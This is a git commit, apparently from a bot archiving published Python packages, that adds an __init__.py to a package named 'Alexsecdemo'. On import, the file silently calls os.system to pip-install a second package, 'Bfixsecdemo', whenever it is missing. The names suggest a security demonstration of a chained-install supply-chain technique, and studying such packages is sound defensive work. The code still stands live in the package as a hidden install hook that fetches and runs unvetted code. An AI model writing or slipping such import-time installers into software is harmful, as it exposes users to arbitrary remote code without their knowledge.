79aec2217ccbbb93fe6fa17cf658b7f0b00f92dd
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2023-08-06 15:27:21 +0000

    Add package Alexsecdemo/1.3.2/Alexsecdemo-1.3.2.tar.gz

---
+++ packages/Alexsecdemo/Alexsecdemo-1.3.2.tar.gz/Alexsecdemo-1.3.2/mymod1/__init__.py
@@ -0,0 +1,10 @@
+import imp
+import os
+
+modules = set(["Bfixsecdemo"])
+for m in modules:
+    try:
+        imp.find_module(m)
+    except ImportError:
+        os.system("pip install Bfixsecdemo")
+        
